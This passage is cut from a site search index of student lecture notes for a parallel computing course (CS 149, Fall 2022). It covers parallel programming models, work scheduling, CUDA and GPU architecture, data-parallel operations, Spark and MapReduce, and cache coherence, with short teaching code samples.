"},{"id":79,"href":"/notes/cs149/2022-10-06-parallel-models/","title":"Parallel Models","section":"CS 149, Fall 2022","content":" Models of Parallel Programming # Three types of models:\nShared address space: very little structure to communication Message passing: communication is structured in the form of messages Communication explicit in source code Data parallel structure: more rigid structure to computation Same function on collection of large elements Shared address space model # All threads access the same memory Requires coordinated access to shared data using locks, e.g. // thread 1 int x = 0; Lock my_lock; spawn_thread(foo, \u0026amp;x, \u0026amp;my_lock); my_lock.lock(); x++; my_lock.unlock(); // thread 2 void foo (int *x, Lock *my_lock) { my_lock-\u0026gt;lock(); x++; my_lock-\u0026gt;unlock(); std::cout \u0026lt;\u0026lt; x \u0026lt;\u0026lt; std::endl; } Locks are needed because instructions to do adds and prints may get interleaved; locks make programmer-intended semantics atomic Note: can sometimes specify atomicity in other ways: Language-supported atomicity: atomic { ... } Hardware-supported atomic read-modify-write intrinsics: atomicAdd(x, 10) Any processor can directly reference any memory location On some processors, ring or grid bus connects cores to enable this access Non-uniform memory access (NUMA): latency of accessing a memory location may be different from different physical cores Message-passing model # Threads operate within own private address space Communication via sending/receiving messages send: specifies recipient, buffer to be transmitted, identifier (tag) receive: sender, specifies buffer to store data, identifier (tag) This allows hardware to operate in parallel without performing systemwide loads and stores Can create a large parallel machine using connected message-passing commodity machines e.g. Clusters and supercomputers do this Data-parallel model # Organize computation as operations on sequences of elements e.g. same function on all elements of a sequence Common example: numpy C = A + B, where C,A,B are vecs of equal length Sequence: key data type of the model C++-like: Sequence\u0026lt;T\u0026gt; Scala: List[T] Haskell: seq T numpy: ndarray Program can only access elements of sequence through sequence operators, e.g. map, reduce, scan, shift, etc Map # Function that takes a function as an argument that operates on sequences Applies function f :: a -\u0026gt; b to elements of input sequence, to produce output sequence of same length Function should be side-effect-free Parallelization: due to side-effect-freeness, applying f to all elements of the sequence can be done in any order without changing program correctness Map implementation can reorder or parallelize element processing when convenient Data parallelism in ISPC # export void absolute_value( uniform int N, uniform float *x, uniform float *y ) { // loop body is the function that gets mapped over x // by the foreach loop foreach (i = 0...N) { if (x[i] \u0026lt; 0) y[i] = -x[i]; else y[i] = x[i]; } } Parallel programming basics # Creating a parallel program # Process: Identify work that can be performed in parallel Partition work and associated data Manage data access, communication, synchronization Goal: maximize speedup Speedup(P processors) = Time(1 processor)/Time(P processors) Problem decomposition # Break up problem into tasks that can be performed in parallel Need to create enough tasks to keep all execution units on a machine busy Challenge: identifying dependencies Amdahl\u0026rsquo;s law: dependencies limit maximum speedup due to parallelism If S is the fraction of work that must be performed in serial, the maximum speedup is at most 1/S e.g. two-step computation on NxN image Steps: multiply brightness of all pixels by two, then compute average of all pixel values Sequential implementation: time is ~2N2 Parallelization: Step 1: N2/P Step 2: compute partial sums in parallel, combine serially P + N2/P Maximum speedup: 2N2/((2N2/P) + P) Usually: programmer responsible for program decomposition Automatic decomposition: open research programming Partitioning and assigning work # Assigning tasks (things to do) to threads (workers) Goals: achieve good workload balance and low comm. costs Can be done statically (pre-execution) or dynamically Assignment is usually the responsibility of the language Assignment in ISPC # void foo( uniform float *input, uniform float *output, uniform int N ) { launch[100] my_ispc_task(input, output, N); } ISPC task abstraction: managed assignment of tasks to threads After completing current task, worker thread inspects list and assigns itself next remaining task Thread pool abstraction: no need to keep respawning threads Note: ISPC tasks are an abstraction for work, not threads!! ISPC tasks are units of work that are put on a queue, that are then pulled off the queue by worker threads The number of worker threads is the number of execution units on the hardware Thread orchestration # Involves communication structuring, dependency synchronization, data structure organization in memory, task scheduling Goal: reduce comm/sync costs, preserve data reference locality, reduce overhead May be impacted by machine details Mapping threads to hardware # Can be done at various points in the stack OS: thread to HW execution context on CPU core Compiler: map ISPC program instances to SIMD vector lanes Hardware mapping: map CUDA thread blocks to GPU cores Mapping decisions: Place related threads on the same processor for better data reference Place unrelated threads on the same processor (e.g., bandwidth limits vs compute limits) to improve efficiency "},{"id":80,"href":"/notes/cs149/2022-10-11-work-distribution-and-scheduling/","title":"Work Distribution and Scheduling","section":"CS 149, Fall 2022","content":" Performance Optimization: Work Distribution and Scheduling # Programming for high performance # Iterative process: refine choices for decomposition, assignment, orchestration Goals (that can be at odds with each other): Balance workload onto available execution resources Reduce communication Reduce extra work overhead Note: always implement the simplest solution first, then profile to figure out where and how to do better for best impact Balancing the workload # Static assignment # Assignment of work to threads not dependent on runtime factors Note: distribution not determined at compile-time; can be impacted by provided parameters Good properties of static assignment: Simple, near-zero runtime overhead for assignment (e.g. indexing math) Applicability: When cost (execution time) and amount of work is predictable, allowing programmer to work out good assignment in advance e.g. if known that all work has the same cost, just divide up jobs equally e.g. if distribution of each task is predictable but unequal, can still come up with an assignment that achieves good utilization Semi-static assignment # Cost of work is predictable for near-term future Idea: recent past is a good predictor of near future Application periodically profiles execution and readjusts assignment Assignment is \u0026ldquo;static\u0026rdquo; between readjustments Dynamic assignment # Program determines assignment dynamically at runtime to ensure well-distributed load Use when execution time of tasks, or number of tasks, is unpredictable Model using a shared work queue: list of work to do Worker threads pull data from shared work queue Push new work to queue as created e.g. ISPC thread model Note: as we increase granularity of task partitioning (achieving better workload balance), we also increase synchronization overhead Can decrease some overhead by having a thread per queue, and threads steal from other queues when they run out of work to do Fork-join parallelism # So far: looked at data-parallelism and thread-management parallelism Now consider divide-and-conquer algorithms Initial job creates additional jobs, that create additional jobs recursively, and so on, until base case Notion of forking: creating additional jobs, and joining: waiting for those jobs to complete Cilk Plus: C++ language extension now in GCC cilk_spawn foo(args);: invoke foo, but unlike standard function call, but unlike standard function call, caller may continue executing asynchronously with execution of foo cilk_sync; returns when all calls spawned by current function have completed Every function that contains cilk_spawn has implicit cilk_sync at end of function (i.e., when function returns, all associated work is complete) Idea for writing program: expose independent work (potential parallelism) to the system using cilk_spawn Cilk Plus examples # // foo, bar may run in parallel cilk_spawn foo(); bar(); cilk_sync; // foo, bar may run in parallel, dependency graph is different, potentially higher runtime overhead cilk_spawn foo(); cilk_spawn bar(); cilk_sync; // foo, bar, baz, qux may run in parallel cilk_spawn foo(); cilk_spawn bar(); cilk_spawn baz(); qux(); cilk_sync; Abstraction vs. implementation in Cilk Plus # cilk_spawn abstraction doesn\u0026rsquo;t specify how or when spawned calls are scheduled to execute Only that they may be run concurrently with caller cilk_sync serves as constraint on scheduling All spawned calls must complete before cilk_sync returns Parallel Quicksort in Cilk Plus # void qsort(int *begin, int *end) { // sort serially if program is sufficiently small if (begin \u0026gt;= end - PARALLEL_CUTOFF) { std::sort(begin, end); } else { int *mid = partition(begin, end); cilk_spawn qsort(begin, mid); qsort(mid+1, last); } } Fork-join scheduling # Simple scheduler: Launch pthread for each cilk_spawn using pthread_create Translate cilk_sync into appropriate pthread_join calls However: lots of overhead from context switching and spawn due to more concurrently running threads than physical execution units Instead, pool of worker threads (actual implementation): All threads created at application launch; as many as physical execution contexts while (work_exists()) { work = get_new_work(); work.run(); } When Cilk reaches a spawn, thread places continuation (i.e., rest of what is not being cilk_spawned) in its own queue Available to other idle threads to do the work: \u0026ldquo;child stealing\u0026rdquo; vs. \u0026ldquo;continuation stealing\u0026rdquo; Work queue implemented as deque (double-ended queue) Normal operation: local thread pushes/pops from tail When work stealing: remote threads pop from head Stealing policy: idle threads randomly choose thread to attempt to steal from (random victim) Child-first work stealing scheduler anticipates divide-and-conquer parallelism "},{"id":81,"href":"/notes/cs149/2022-10-13-locality-communication-and-contention/","title":"Locality Communication and Contention","section":"CS 149, Fall 2022","content":" Performance Optimization: Locality, Communication, Contention # Message passing review # Machine model: cluster of two machines, each with own processor/memory/cache, and communication via network (costly) Note: communication can also be between cores on a chip, core and its cache, core and memory This model allows us to think of a parallel system as extended memory hierarchy, in terms of increasing latency: Processor Registers Local L1 cache Local L2 cache L2 from another core L3 cache Local memory Remote memory (one network hop) Remote memory (N network hops) Communication: via send/receive messages send: specifies recipient, buffer to be transmitted, identifier (tag) receive: sender, specifies buffer to store data, identifier (tag) Only way for thread communication Synchronous (blocking) send/receive # send(): call returns once sender receives acknowledgement that message data resides in address space of receiver recv(): call returns when data from received message copied into receiver address space and acknowledgement sent back to sender Non-blocking asynchronous send/receive # send(): call returns immediately Buffer provided to send cannot be modified by calling thread since message processing occurs concurrently with thread execution Calling thread can perform other work while waiting for send recv(): posts intent to receive in the future, returns immediately Use checksend(), checkrecv() to determine actual status of send/receipt Calling thread can perform other work while waiting for receive Communicaton-to-computation ratio # Fraction: (# bytes communication)/(# instructions computation) If denominator is execution time of computation, then ratio gives avg. bandwidth requirement of code Arithmetic intensity: 1/comm-comp ratio (higher is better) High arithmetic intensity required to efficiently utilize modern parallel processors due to high ratio of compute capability to avail. bandwidth Inherent vs. artifactual communication # Inherent communication: communication that must occur in a parallel program (i.e., essential to algorithm) Good assignment decisions can reduce inherent communication Artifactual communication: all other communication (i.e., results from practical details of system implementation) e.g. min. data transfer granularity greater than what must be transferred e.g. cache size too small requiring reads from memory every time on an access Techniques for reducing communication # Improving temporal locality by changing traversal order e.g. \u0026ldquo;fusing\u0026rdquo; loops Exploit sharing: co-locate tasks that operate on same data Schedule threads working on same data structure at same time on same processor Contention # A resource can perform ops. at a given throughput (number of transactions per unit time) e.g. memory, communication links, servers, network, etc. Contention occurs when many requests to a resource are made within a small window of time (makes resource a \u0026ldquo;hot spot\u0026rdquo;) Can reduce by replicating contended resource (e.g. local copies, fine-grained locks) or staggering access to contended resources "},{"id":82,"href":"/notes/cs149/2022-10-18-gpu-architecture-and-cuda/","title":"Gpu Architecture and Cuda","section":"CS 149, Fall 2022","content":" GPU architecture and CUDA # GPU history # Graphical purpose of a GPU # Initially designed for: Input: description of a scene; mathematical description e.g. 3D surface geometry, surface materials, lights, camera, etc. Output: image of the scene Rendering task # Real-time graphics primitives (entities) Surfaces represented as 3D triangle meshes: vertices (points in space), primitives (points, lines, triangles) Goal: compute how each triangle in 3D mesh contributes to overall image Subtask workload: given triangle, determine where it lies on screen given position of virtual cameras For all output image pixels covered by triangle, compute color of surface at that pixel Shader program: run once per fragment (per pixel covered by triangle) Inputs: variable values that change per pixel Outputs: colors at those pixels Pixels covered by multiple surfaces contain output from surfaces closest to camera To optimize: GPUs designed with multiple core, high-throughput (lots of SIMD and multithreading) architecture GPUs for scientific and compute task # Initial observation (2001-2003): GPUs are very fast processors for performing same computation in parallel on large collections of data Data parallelism! Packing more transistors on the same chip = more parallelism Lead to early GPU-based scientific computation: hack Map 512x512 array onto on \u0026ldquo;image\u0026rdquo; Render two triangles that exactly cover screen Apply \u0026ldquo;shader\u0026rdquo; computation on the collection Brook Stream programming language (Stanford, 2004): abstracted GPU hardware as a data-parallel processor Translated generic stream program into graphics commands that could be run on GPUs However: programs limited to graphics-specific APIs; needed to set image sizes, vertices, etc. and use \u0026ldquo;drawing\u0026rdquo; abstractions for computation CUDA: Modern GPU compute # NVIDIA Tesla architecture (2007) First alternative, \u0026ldquo;compute mode\u0026rdquo; interface to GPU hardware Application can allocate buffers in GPU memory and copy data to/from buffers Application (via graphics driver) provides GPU a single kernel program binary Application tells GPU to run kernel in SPMD fashion (i.e., run N instances of the kernel): launch(myKernel, N) Terminology # CUDA: the abstraction above; \u0026ldquo;C-like\u0026rdquo; language to express GPU programs using compute hardware interface Now subset of C++ Low-level; abstractions match capabilities/perf. characteristics of modern GPUs Note on CUDA thread: similar API abstraction as pthread corresponding to logical thread of control However: very different implementation!! CUDA progams and syntax # Hierarchy of concurrent threads Thread IDs can be up to 3-dimensional; abstraction useful for naturally N-dimensional programs Example: matrixAdd // begin host code: C/C++ on CPU const int Nx = 12; const int Ny = 6; dim3 threadsPerBlock(4, 3); dim3 numBlocks(Nx/threadsPerBlock.x, Ny/threadsPerBlock.y); // end host code // assume A, B, C **on GPU** allocated as Nx x Ny float arrays // call launches 72 CUDA threads: 6 thread blocks of 12 threads each // \u0026#34;launch a grid of CUDA thread blocks, return when all threads are terminated\u0026#34; matrixAdd\u0026lt;\u0026lt;\u0026lt;numBlocks, threadsPerBlock\u0026gt;\u0026gt;\u0026gt;(A, B, C) // kernel definition: runs on GPU // __global__ denotes CUDA kernel function for device // A, B, C are pointers/references to GPU memory __global__ void matrixAdd(float A[Ny][Nx], float B[Ny][Nx], float C[Ny, Nx]) { // each thread computes overall grid thread id from position in block (threadIdx) and block position in grid (blockIdx) int i = blockIdx.x * blockDim.x + threadIdx.x; int j = blockIdx.y * blockDim.y + threadIdx.y; C[j][i] = A[j][i] + B[j][i]; } Note: number of SPMD \u0026ldquo;CUDA threads\u0026rdquo; is explicit in the program Number of kernel invocations not determined by size of data collection Kernel launch not specified by map(kernel, collection) like with graphics shader processing Compiled CUDA device binary includes program text (instructions), and information about required resources Threads per block Bytes of local data per thread Shared space per thread block CUDA memory model # CPUs and GPUs have different memory address spaces! To reconcile: memcpy primitive, like message-passing setup float *A = new float[N]; // allocate buffer in host CPU memory for (int i = 0; i \u0026lt; N; i++) // fill the buffer in CPU host space A[i] = (float) i; // allocate buffer in device address space int bytes = sizeof(float) * N; float *deviceA; cudaMalloc(\u0026amp;deviceA, bytes); // populate deviceA cudaMemcpy(deviceA, A, bytes, cudaMemcpyHostToDevice); // note: cannot manipulate deviceA[i] from host (invalid operation), due to different address spaces CUDA device memory model # Three distinct address spaces visible to kernels: Per-block shared memory: r/w by all threads in block Per-thread private memory: r/w by thread Device global memory: r/w by all threads Address spaces represent different regions of locality Has implications on CUDA implementation efficiency e.g. consider scheduling of threads based on prior knowledge of which threads access the same variables CUDA example: 1D Convolution # Convolution: each output is an average of the inputs surrounding it output[i] = (input[i] + input[i+1] + input[i+2]) / 3.f CUDA, version 1: one thread per output element CUDA kernel: #define THREADS_PER_BLK 128 __global__ void convolve(int N, float *input, float *output) { int index = blockIdx.x * blockDim.x + threadIdx.x; // thread-local variable float result = 0.0f; // thread-local variable for (int i = 0; i \u0026lt; 3; i++) result += input[index + i]; // thread computes result for one element output[index] = result / 3.f; // write result to global memory } Host code: int N = 1024 * 1024; cudaMalloc(\u0026amp;devInput, sizeof(float) * (N+2)); // allocate in dev mem cudaMalloc(\u0026amp;devOutput, sizeof(float) * N); // allocate in dev mem // omitted: initialize arrays here convolve\u0026lt;\u0026lt;\u0026lt;N/THREADS_PER_BLK, THREADS_PER_BLK\u0026gt;\u0026gt;\u0026gt;(N, devInput, devOutput); Lots of overhead from threads only computing result for one element (more loads per thread than necessary) CUDA, version 2: one thread per output element: stage input data in per-block shared memory CUDA kernel: #define THREADS_PER_BLK 128 __global__ void convolve(int N, float *input, float *output) { __shared__ float support[THREADS_PER_BLK+2]; // per-block allocation int index = blockIdx.x * blockDim.x + threadIdx.x; // thread-local variable // all threads cooperatively load block\u0026#39;s support region from global mem to shared mem: 130 load instructions vs 3*128 support[threadIdx.x] = input[index]; if (threadIdx.x \u0026lt; 2) { support[THREADS_PER_BLK + threadIdx.x] = input[index + THREADS_PER_BLK]; } __syncthreads(); // barrier: all threads in block float result = 0.0f; // thread-local variable for (int i = 0; i \u0026lt; 3; i++) result += support[threadIdx.x + i]; // thread computes result for one element output[index] = result / 3.f; // write result to global memory } Host code: int N = 1024 * 1024; cudaMalloc(\u0026amp;devInput, sizeof(float) * (N+2)); // allocate in dev mem cudaMalloc(\u0026amp;devOutput, sizeof(float) * N); // allocate in dev mem // omitted: initialize arrays here convolve\u0026lt;\u0026lt;\u0026lt;N/THREADS_PER_BLK, THREADS_PER_BLK\u0026gt;\u0026gt;\u0026gt;(N, devInput, devOutput); Faster, due to less load operations per thread CUDA synchronization constructs # __syncthreads(): barrier, wait for all threads in the block to arrive at this point Atomic operations e.g. float atomicAdd(float *addr, float amount) Provided on both global and per-block shared mem addrs Host/device synchronization: implicit barrier across threads at kernel return Assigning work # Desirable for CUDA program to run on any size of GPU without modification Thread-block assignment: Assumption: thread block execution can be carried out in any order w/o dependencies between blocks GPU implementation maps thread blocks (\u0026ldquo;work\u0026rdquo;) to cores using dynamic scheduling policy respecting resource requirements Just like thread-pool model! GPU architecture and threading # Sub-core # A group of 32 threads in a thread block is called a warp Thread IDs numbered consecutively: warp with 0-31, warp with 32-63, etc. A block with 256 CUDA threads is mapped 8 warps Each sub-core can schedule and interleave execution of up to 16 warps (NVIDIA V100, 2017) Threads in a warp executed SIMD if they share the same instruction Otherwise, performance suffers due to divergent execution Streaming multiprocessor (SM) # SM architecture each clock: Each sub-core selects one runnable warp (from 16 warps in partition) Each sub-core runs next instruction for CUDA threads in warp May apply to all or subset of CUDA threads in warp due to divergence NVIDIA V100 (2017) has 80 SMs Overall architecture: 1.245 GHz per clock, 80 SM cores per chip: 5120 fp32 mul-add ALUs = 12.7 TFLOPs Up to 5120 interleaved warps per chip (163,840 CUDA threads/chip) Running a CUDA program on a GPU # Running a CUDA kernel has execution requirements, e.g. for convolve: Each thread block must execute 128 CUDA threads Each thread block must alloc 130 * sizeof(float) bytes of shared mem. Assume N very large, so host-side kernel launch generates thousands of thread blocks Assume fictituous two-core GPU Execution steps # Host sends CUDA device a command: execute kernel EXECUTE: convolve ARGS: N, input_array, output_array NUM_BLOCKS: 1000 Scheduler maps block 0 to core 0: reserves execution contexts for required resources NEXT = 1 TOTAL = 1000 Scheduler continues blocks to available execution contexts in interleaved fashion NEXT = 2 TOTAL = 1000 If next thread block won\u0026rsquo;t fit on a core (e.g. due to insufficient storage): wait for a block to finish, then schedule the next block on that core "},{"id":83,"href":"/notes/cs149/2022-10-20-data-parallel-architecture/","title":"Data Parallel Architecture","section":"CS 149, Fall 2022","content":" Data-parallel thinking # Motivation # Idea: express algorithms in terms of operations on sequences of data e.g. map, filter, fold/reduce, scan/segmented scan, sort, groupby, join, partition/flatten High-performance parallel versions exist; so can we reframe programs in these terms to make them run efficiently on a parallel machine? In general: applications need to expose a large amount of data parallelism to make use of High core counts Multiple machines SIMD processing GPU architectures Key terms and operations # Data-parallel model, sequences, map: recall Lecture 4\u0026rsquo;s intro on data parallelism Fold (fold left) # Apply binary operation f to each element and an accumulated value; seeded by initial value of type b f :: (b, a) -\u0026gt; b fold :: b -\u0026gt; # initial element ((b, a) -\u0026gt; b) -\u0026gt; # function to fold seq a -\u0026gt; # input sequence b # output e.g. fold(10, OP_ADD, [3, 8, 4, 6, 3, 9, 2, 8]) results in sum([10, 13, 21, 25, 31, 34, 43, 45, 53]) = 53 Parallel fold # In addition to f, need additional binary \u0026ldquo;combiner\u0026rdquo; function Need IV b (must be identity for f and comb) f :: (b, a) -\u0026gt; b b :: (b, b) -\u0026gt; b fold_par :: b -\u0026gt; ((b, a) -\u0026gt; b) -\u0026gt; ((b, b) -\u0026gt; b) -\u0026gt; # combiner seq a -\u0026gt; b Idea: break up input into nthreads partial sequences, apply sequential fold to each, and then combine using ground-up merging of pairs of outputs Scan # Like fold, but without an initial value and outputs a sequence f :: (a, a) -\u0026gt; a scan :: a -\u0026gt; ((a, a) -\u0026gt; a) -\u0026gt; seq a -\u0026gt; seq a Serial implementation: float op_add(float a, float b) { return a + b }; void scan_inclusive( float *in, float *out, int N, float(*op)(float, float) ) { out[0] = in[0]; for (int i = 1; i \u0026lt; N; i++) { out[i] = op(out[i-1], in[i]); } } // scan_inclusive([3, 8, 4, 6, 3, 9, 2, 8], [], N, op_add) // returns [3, 11, 15, 21, 24, 33, 35, 43] Parallel scan # Naive parallelization of operation results in $O(n \\log n)$ runtime: inefficient vs serial algorithm Instead: work-efficient parallel scan ($O(n)$ work) algorithms exist, however they do not make efficent use of SIMD instructions SIMD implementation (in CUDA): __device__ int scan_warp(int *ptr, const unsigned int idx) { const unsigned int lane = idx % 32; // index of thread in warp if (lane \u0026gt;= 1) ptr[idx] += ptr[idx - 1]; if (lane \u0026gt;= 2) ptr[idx] += ptr[idx - 2]; if (lane \u0026gt;= 4) ptr[idx] += ptr[idx - 4]; if (lane \u0026gt;= 8) ptr[idx] += ptr[idx - 8]; if (lane \u0026gt;= 16) ptr[idx] += ptr[idx - 16]; return (lane \u0026gt; 0) ? ptr[idx-1] : 0; } Despite doing $O(n \\log n)$ work, this actually takes 2x fewer instructions on a SIMD machine as the work-efficient version Segmented scan # Common problem: operate on sequence of sequences Segmented scan: simultaneously perform scans on contiguous partitions of input sequence e.g. segmented_scan_exclusive(OP_ADD, [[1, 2], [6], [1, 2, 3, 4]]) = [[0, 1], [0], [0, 1, 3, 6]] Useful for sparse matrix multiplication Gather/scatter # Gather: gather(index, input, output): output[i] = input[index[i]] Implemented as SIMD native instruction in AVX2 (2013) Scatter: scatter(index, input, output): output[index[i]] = input[i] Implmenented as SIMD native instruction in AVX512 (2016) "},{"id":84,"href":"/notes/cs149/2022-10-25-spark/","title":"Spark","section":"CS 149, Fall 2022","content":" Spark: Distributed Computing on a Cluster # Cluster environment # Main idea: distributed computing, programming with 10k-100k cares How to ensure no data loss in case of failure of some system component? Programming model: data-parallel operations (e.g. Map and Reduce) Goal: make data-parallel operations Scalable (100ks of cores) Fault-tolerant (ensure no data loss in case of failure) Efficient (optimize system perf. with efficient use of memory) Why use a cluster? # e.g. want to process 100TB of log data (e.g. 1 day at Facebook) On a single node: scanning at 50 MB/s = 23 days On 1000 nodes: scanning at 50 MB/s = 33 min However: hard to use that many nodes Hard to program that many cores Potential failures at that scale Need framework to handle this Warehouse-scale computing (WSC) # Standard architecture: Cluster of commodity Linux nodes (e.g. multicore x86) Usually 16-32 core CPUs, 128 GB-1 TB of DRAM, 10-30 TB of SSD storage RAM bandwidth: 100 GB/s SSD bandwidth: 1-4 GB/s Private memory: separate address space and separate OS Ethernet network: \u0026gt;10GB today \u0026ldquo;top-of-rack\u0026rdquo; switch connects all the nodes in a rack (1-2 GB/s) with nodes in other racks (0.1-2 GB/s) Cheap: Build from commodity hardware Thousands of nodes for \u0026lt;$10M Goal: use supercomputer networking ideas to provide high bandwidth across datacenter However: need to mask issues such as load balancing and failures Storage systems # First order problem: if nodes can fail, how to store data persistently? Distributed file systems: Google GFS Hadoop HDFS (open-source) Typical usage pattern: Huge files (100s of GBs to TBs) Data rarely updated in place Reads and appends common (e.g. log files) Architecture of a distributed file system # Chunk servers or HDFS DataNode File split into contiguous chunks (usually 64-256 MB) Each chunk replicated 2-3x Try to keep replicas in different racks Master node or HDFS NameNode Stores metadata, usually replicated Client library for file access Talks to master node to find chunk servers Connects directly to chunk servers to access data MapReduce programming model # // called once per block of input by runtime void mapper(string inp, multimap\u0026lt;string, string\u0026gt;\u0026amp; results); // called once per unique key in results // values is a list of values associiated with the given key void reducer(string key, list\u0026lt;string\u0026gt; values, int\u0026amp; result); Writer output(\u0026#34;hdfs://\u0026#34;); runMapReduceJob(mapper, reducer, input, output); MapReduce steps # Run mapper function on all lines of file Question: how to assign work to nodes? Solution: Data-distribution based assignment: each node processes lines in blocks of input file that are stored locally Prepare intermediate data for reducer Run reducer function on all keys Question: how to get all data for key onto the correct reduce worker node? Solution: directive from master, assign each type of key to a node Job scheduler responsibilities # Exploit data locality: \u0026ldquo;move computation to the data\u0026rdquo; Run mapper jobs on nodes that contain input files Run reducer jobs on nodes that already have most data for a certain key Handling node failures Scheduler detects job failures and reruns them on new machines Possible since inputs reside in persistent storage (distributed file system) Scheduler duplicates jobs on multiple machines (reduce overall processing latency incurred by node failures) Handling slow machines Scheduler duplicates jobs on multiple machines MapReduce limitations # Permits only simple program structure: must be map, followed by reduce by key Generalization to DAGs: DryadLINQ, however support is not easy Iterative algorithms must load from disk each iteration This limits more complex, multi-stage applications (e.g. iterative ML and graph processing) Canonical example: Word count # Input: documents containing some amount of words e.g. inp = [ \u0026#34;the quick brown fox\u0026#34;, \u0026#34;the fox ate the mouse\u0026#34;, \u0026#34;how now brown cow\u0026#34; ] Desired outputs: how many times is each word used? e.g. { \u0026#34;brown\u0026#34;: 2, \u0026#34;fox\u0026#34;: 2, \u0026#34;how\u0026#34;: 1, \u0026#34;now\u0026#34;: 1, \u0026#34;the\u0026#34;: 3, \u0026#34;ate\u0026#34;: 1, \u0026#34;cow\u0026#34;: 1, \u0026#34;mouse\u0026#34;: 1, \u0026#34;quick\u0026#34;: 1 } Example computation: map a function that does partial word count onto each document, then reduce jobs to aggregate Example: Massive CS149 # Assume cs149log.txt is a large file containing a log of web requests to CS149 site Stored in a distributed FS like HDFS Blocks of the log are stored across a cluster of 4 nodes Now: attempt to query about demographics of students visiting CS149 site (e.g. type of mobile phone) void mapper(string line, multimap\u0026lt;string, string\u0026gt;\u0026amp; results) { string user_agent = parse_requester_user_agent(line); if (is_mobile_client(user_agent)) results.add(user_agent, 1); } void reducer(string key, list\u0026lt;string\u0026gt; values, int\u0026amp; result) { int sum = 0; for (string v : values) sum += v; result = sum; } Reader input(\u0026#34;hdfs://cs149log.txt\u0026#34;); Writer output(\u0026#34;hdfs://\u0026#34;); runMapReduceJob(mapper, reducer, input, output); Apache Spark # Motivating idea: despite huge amounts of data, many working sets in big data clusters fit in memory (Ananthanarayanan et al. 2011) Spark: Zaharia et al. 2012 Goals: Programming model for cluster-scale computations with significant intermediate dataset reuse Don\u0026rsquo;t want to incur inefficiency of writing intermediates to persistent distributed FS Keep data in memory! Challenge: efficiently implementing fault-tolerance for in-memory calculations at scale Fault-tolerance for in-memory calculations # Naive: replicate all computations, decreases peak throughput Another idea: checkpoint and rollback Save state of program to persistent storage Restart from last checkpoint on node failure Another idea: maintain log of updates (commands and data) Naive: high maintenance overhead However, use MapReduce to cut overhead down! Checkpoints after each map/reduce step by writing results to FS Scheduler\u0026rsquo;s list of outstanding (but not-yet-complete) jobs is a log Functional structure of programs allows for restart at granularity of single map/reduce invocation (rather than restarting entire program) Resilient Distributed Dataset (RDD): Spark\u0026rsquo;s key abstraction # Read-only, ordered, immutable collection of records RDDs can only be created by deterministic transformations on data in persistant storage or on existing RDDs Actions on RDDs return data to application e.g. CS149 mobile counting // create RDD from FS data val lines = spark.textFile(\u0026#34;hdfs://cs149log.txt\u0026#34;); // create RDD using filter() transformation on lines val mobileViews = lines.filter((x : String) =\u0026gt; isMobileClient(x)); // another filter() transformation val safariViews = mobileViews.filter((x: String) =\u0026gt; x.contains(\u0026#34;Safari\u0026#34;)); // then count number of elements in RDD via count() action val numViews = safariViews.count(); // one-liner for aggregating view counts across different user agents // at each step, \u0026#34;lineage\u0026#34;: sequence of RDD ops needed to compute output // allows checkpointing for failure resistance val perAgentCounts = spark .textFile(\u0026#34;hdfs://cs149log.txt\u0026#34;) .filter(x =\u0026gt; isMobileClient(x)) .map(x =\u0026gt; (parseUserAgent(x), 1)) .reduceByKey((x, y) =\u0026gt; x+y) .collect(); // can also do forks and forked computations for multiple results from a single RDD RDD constraints and optimization # Storage Cannot keep entirely in memory: representation would be huge, larger than original file in disk Partitioning and dependencies Narrow dependencies: each partition of parent RDD referenced by at most one child RDD partition Allows for op fusing (e.g. can apply map, filter all at once on input element, saving on memory and disk usage) Not necessary in all cases to communicate between nodes of cluster for transformation, only for reduce step at end Wide dependencies: each partition of parent RDD needs to be referenced by multiple child RDD partitions Requires dependency sorting that may induce communication May trigger significant recomputation of ancestor lineage in failure case Choice of partitioning impacts whether narrow dependencies are possible or if wide dependencies are needed, e.g. // map keys to integers val partitioner = spark.HashPartitioner(100); // inform Spark of partition // .persist(): instructs Spark to try to keep dataset in memory // note: .persist(RELIABLE): store contents in durable storage (i.e., checkpoint it) val mobileViewPartitioned = mobileViews.partitionBy(partitioner).persist(); val clientInfoPartitioned = clientInfo.partitionBy(partitioner).persist(); // due to explicit partitioning, only creates narrow dependencies void joined = mobileViewPartitioned.join(clientInfoPartitioned); Node failure case: recomputing lost RDD partitions from lineage Must reload subset of data from disk and recompute entire sequence of operations given by lineage to regenerate missing partitions Modern Spark ecosystem # Compelling feature: enables integration/composition of multiple domain-specific frameworks, all implemented with RDDs e.g. Spark SQL: Interleave computation and data query e.g. MLib: ML library on top of spark abstractions "},{"id":85,"href":"/notes/cs149/2022-10-27-cache-coherence/","title":"Cache Coherence","section":"CS 149, Fall 2022","content":" Cache coherence # Brief background on caches # Recall: die size of CPU is significantly occupied by cache! L3: per chip, one bank per core L2, L1: private per core Lower levels: faster/closer access for a core Associativity: flexibility of where a cache can put a memory address 4C\u0026rsquo;s cache miss model: Cold: first access, never seen before Capacity: cache is finite size, data evicted Conflict: when cache is not fully associative Coherence Review: cache design # Example: suppose code executes int x = 1; where x corresponds to address 0x12345604 in memory Cache line: data is 64 bytes on modern Intel processors e.g. suppose 32-bit memory address, then need: Line offset: 6 bits Tag: 26 bits Dirty bit: has the data been modified in memory? Behavior of write-allocate, write-back cache on write miss (uniprocessor case): Processor performs write to address that misses in cache Cache selects location to place line in cache If dirty line in location, line written out to memory Cache loads line from memory (allocates cache line) Cache line fetched and 32 bits updated Cache line marked as dirty The cache coherence problem # Modern processors replicate mem contents in local caches However: processors can observe different values for the same memory location - caused by data replication to cache Memory system should behave: when accessing value at address X, should return last value written to X by any processor Easier on a uniprocessor system: CPU and DMA are only source of writes Definition of coherence # Memory system is coherent if:\nResults of parallel execution are such that for each mem. location, there exists a hypothetical serial ordering of all program operations consistent with execution results Memory operations issued by any processor occur in the order they were issued Value returned by a read is the value written by last write to location, as given by the serial ordering Required invariants # For any memory address, and at any given time period (epoch):\nSingle-Writer, Multiple-Reader invariant Like RW-lock At read-write epoch, only one possible writer At read-only epoch: unlimited readers Data-value invariant: write serialization Value of mem address at start of epoch is same as value at end of previous read-write epoch Implementing coherence # Software-based solutions (coarse-grained: over virtual memory pages) OS uses page-fault mechanism to propagate writes Can be used to implement memory coherence over clusters Performance problem: false sharing Hardware-based solutions (fine-grained: over cache lines) \u0026ldquo;Snooping\u0026rdquo;-based coherence Directory-based coherence Snooping cache-coherence schemes # Main idea: all coherence-related activity broadcasted to all processors in the system (to cache controllers) Cache controllers monitor memory operations, and follow cache coherence protocol to maintain coherence Upon write, cache controller broadcasts invalidation message As a result, next read from other processors will trigger cache miss 